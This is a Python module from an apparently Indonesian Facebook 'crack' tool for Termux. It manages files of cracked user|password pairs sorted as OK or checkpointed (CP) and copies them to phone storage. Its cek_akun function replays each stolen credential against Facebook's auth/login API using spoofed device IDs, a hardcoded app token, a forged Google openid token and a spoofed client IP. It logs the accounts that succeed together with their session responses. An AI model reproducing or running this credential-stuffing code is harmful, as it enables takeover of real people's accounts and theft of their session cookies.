import requests, os, time, uuid, json, random

from rich import print as prs
from .Module import Tod
from bluid.data import UserAgent
from bluid.logo import Logo

H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
N = '\x1b[0m'	 # WARNA MATI
M = "\x1b[0;31m" # Merah

class Asu:

    def __init__(self, asw):
        self.asw = asw

    def tampilkan_folder(self):
        dirs = []
        try:
            if not os.path.exists("data/result"):
                exit(f"\n[{M}!{N}] Folder '{M}data/result{N}' tidak ditemukan!")

            dirs = sorted([d for d in os.listdir("data/result") if os.path.isdir(os.path.join("data/result", d))])
        except:
            exit(f"\n[{M}!{N}] Terjadi kesalahan saat membaca folder")

        if not dirs:
            exit(f"\n[{M}!{N}] Tidak ada folder tersedia di '{M}data/result{N}'")

        for i, folder in enumerate(dirs, start=1):
            print(f"[{H}{i}{N}] {folder}")
        print(f"[{M}0{N}] Kembali ke menu utama.")
        return dirs

    def tampilkan_file(self, folder):
        files = []
        try:
            files = sorted(os.listdir(os.path.join("data/result", folder)))
        except:
            exit(f"\n[{M}!{N}] Terjadi kesalahan saat membaca file di folder")

        if not files:
            exit(f"\n[{M}!{N}] Tidak ada file di folder ini")

        print("-" * 39)
        for i, file in enumerate(files, start=1):
            print(f"[{H}{i}{N}] {file}")
        print(f"[{M}0{N}] Kembali ke folder utama.")
        return files

    def cek(self):
        while True:
            Logo("fesnuk")
            print(self.asw)
            folders = self.tampilkan_folder()
            patc = input("\n[?] Pilih folder (nomor): ").strip()

            if patc in ["0", "00"]:
                return
            
            if not patc.isdigit() or int(patc) < 1 or int(patc) > len(folders):
                print(f"\n[{M}!{N}] Pilihan folder tidak valid! Coba lagi.")
                time.sleep(1)
                continue

            folder = folders[int(patc) - 1]
            while True:
                Logo("fesnuk")
                print(self.asw)
                asu = folder.replace("OK", f"{H}OK{N}").replace("CP", f"{K}CP{N}")

                print(f"[{H}+{N}] Anda memilih folder: {asu}")
                files = self.tampilkan_file(folder)
                file_input = input("\n[?] Pilih file (nomor): ").strip()

                if file_input in ["0", "00"]:
                    break

                if not file_input.isdigit() or int(file_input) < 1 or int(file_input) > len(files):
                    print(f"\n[{H}!{N}] Pilihan file tidak valid! Coba lagi.")
                    time.sleep(1)
                    continue

                file_name = files[int(file_input) - 1]
                file_path = os.path.join("data/result", folder, file_name)
                print()
                print(f"[{H}+{N}] Membuka file: {file_name}")
                print()
                try:
                    with open(file_path, "r") as f:
                        content = f.read().strip()
                    if "CP" in file_name:
                        print(content)
                        print("---------------------------------------")
                        while True:
                            apa = input("[?] simpan hasil crack nya ke sdcard?/cek cp (s/c): ")
                            if apa in ["C", "c"]:
                                self.mulai_cek()
                                input(f"[{H}+{N}] Tekan Enter untuk melanjutkan...")
                            elif apa in ["S", "s"]:
                                self.simpan_ke_storage(file_path, content)
                            else:
                                print(f"\n[{M}!{N}] s/c")
                                time.sleep(3)
                                continue

                    elif "OK" in file_name:
                        print(content)
                        print("---------------------------------------")
                        while True:
                            apa = input("[?] simpan hasil crack nya ke sdcard? (Y/t): ")
                            if apa in ["Y", "y"]:
                                self.simpan_ke_storage(file_path, content)
                            elif apa in ["T", "t"]:
                                input(f"[{H}+{N}] Tekan Enter untuk melanjutkan...");self.cek()
                            else:
                                print(f"\n[{M}!{N}] s/c")
                                time.sleep(3)
                                continue

                except Exception as e:
                    print(f"Error membaca file: {e}")


    def get_storage_path(self):
        possible_paths = [
            "/storage/emulated/0",
            "/sdcard"
        ]
        for path in possible_paths:
            if os.path.exists(path):
                return path
        return None


    def simpan_ke_storage(self, file_name, data):
        storage_path = self.get_storage_path()
        if not storage_path:
            print(f"\n[{M}!{N}] Akses ke penyimpanan belum diizinkan. Memulai proses perizinan, silakan tekan 'Y' untuk melanjutkan.")
            time.sleep(5)
            os.system("termux-setup-storage")
            return

        remote_file = file_name.replace("data/result/CP/", "").replace("data/result/OK/", "")
        folder_name = "CP" if remote_file.startswith("CP-") else "OK"
        full_patcch = os.path.join(storage_path, "brute", "result", folder_name, remote_file)
        try:
            os.makedirs(os.path.dirname(full_patcch), exist_ok=True)
            with open(full_patcch, "a") as file:
                file.write(data + "\n")
                print(f"\n[{H}+{N}] File disimpan di: {full_patcch}")

            os.remove(file_name)
            input(f"[{H}+{N}] Tekan Enter untuk melanjutkan...");self.cek()
        except Exception as e:
            print(f"[-] Gagal menyimpan atau menghapus file: {e}")


    def mulai_cek(self, tod):
        print("---------------------------------------")
        print("       PROSES CRACK ULANG AKUN CP      ")
        print("---------------------------------------")
        ips = Tod().get_ip()
        with open(tod, "r") as file:
            lines = file.readlines()
        for line in lines:
            parts = line.strip().split('|')
            try:
                self.cek_akun(parts[0], parts[1], ips)
            except Exception as e:exit(e)

        exit(
            f"""
---------------------------------------
{H}PROSES CRACK ULANG AKUN CP TELAH SELESAI{N}
---------------------------------------
[{H}+{N}] save to: data/HASIL-CEK-CP/OK/OK-{Tod().tggl()}.txt
[{H}+{N}] save to: data/HASIL-CEK-CP/CP/CP-{Tod().tggl()}.txt
---------------------------------------"""
        )
    def save_to_json(self, filename, data):
        existing_data = []
        if os.path.exists(filename):
            with open(filename, "r") as f:
                try:
                    existing_data = json.load(f)
                    if not isinstance(existing_data, list):
                        existing_data = [existing_data]
                except json.JSONDecodeError:
                    existing_data = []

        existing_data.append(data)
        with open(filename, "w") as f:
            json.dump(existing_data, f, indent=4)  #

    def cek_akun(self, user, pw, ips):
        ses = requests.Session()
        try:
            print(user+"|"+pw)
            time.sleep(3)
            ua = UserAgent().ua_facebook("api")
            data = {
                'adid':str(uuid.uuid4()),
                'format': 'json',
                'device_id':str(uuid.uuid4()),
                'family_device_id':str(uuid.uuid4()),
                'secure_family_device_id':str(uuid.uuid4()),
                'cpl': 'true',
                'try_num': '1',
                'email': user,
                'password': pw,
                'method': 'auth.login',
                'generate_session_cookies': '1',
                'sim_serials': "['80973453345210784798']",
                'openid_flow': 'android_login',
                'openid_provider': 'google',
                'openid_emails': "['01710940017']",
                'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
                'error_detail_type': 'button_with_disabled',
                'source': 'account_recovery',
                'locale': 'id_ID',
                'client_country_code': 'ID',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'
            }
            headers = {
                'Host': 'graph.facebook.com',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Priority': 'u=3, i',
                'X-Fb-Sim-Hni': '45204',
                'X-Fb-Net-Hni': '45201',
                'X-Fb-Connection-Quality': 'GOOD',
                'Zero-Rated': '0',
                'User-Agent': ua,
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'X-Fb-Connection-Bandwidth': '24807555',
                'X-Fb-Connection-Type': 'unknown',
                'X-Fb-Device-Group': '5120',
                'X-Tigon-Is-Retry': 'False',
                'X-Fb-Friendly-Name': 'authenticate',
                'X-Fb-Request-Analytics-Tags': 'unknown',
                'X-Fb-Http-Engine': 'Liger',
                'X-Fb-Client-Ip': random.choice(["True", ips]),
                'X-Fb-Server-Cluster': 'True',
                'Content-Length': str(len(str(data)))
            }
            response = ses.post(
                "https://b-graph.facebook.com/auth/login",
                headers=headers, 
                data=data, 
                allow_redirects=False, 
                verify=True
            ).json()

            result = {
                "user": user,
                "password": pw,
                "response": response
            }

            if "session_key" in response:
                prs(response)
                print()
                open(f"data/HASIL-CEK-CP/OK/OK-{Tod().tggl()}.txt", "a").write(f"{user}|{pw}\n")
                self.save_to_json(f"data/HASIL-CEK-CP/json/OK-{Tod().tggl()}.json", result)  

            elif 'User must verify their account' in response['error']['message']:
                prs(response)
                print()
                open(f"data/HASIL-CEK-CP/CP/CP-{Tod().tggl()}.txt", "a").write(f"{user}|{pw}\n")
                self.save_to_json(f"data/HASIL-CEK-CP/json/CP-{Tod().tggl()}.json", result)  

            else:
                prs(response)
                print()

        except Exception as e:exit(e)